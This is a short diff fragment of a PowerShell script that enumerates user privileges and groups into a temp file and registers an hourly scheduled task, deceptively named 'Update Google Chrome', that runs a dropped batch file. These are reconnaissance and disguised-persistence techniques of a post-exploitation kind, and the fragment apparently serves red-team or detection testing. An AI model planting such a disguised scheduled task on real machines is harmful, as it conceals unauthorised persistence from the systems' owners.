@@ -5,3 +5,4 @@ whoami /priv >> $env:temp\enum.txt
 whoami /groups >> $env:temp\enum.txt
 write-output "dir c:\ > c:\dir.txt"  > $env:temp\test.bat
 schtasks /create /sc hourly /tn "Update Google Chrome" /tr "cmd /c $env:temp\test.bat"
+#
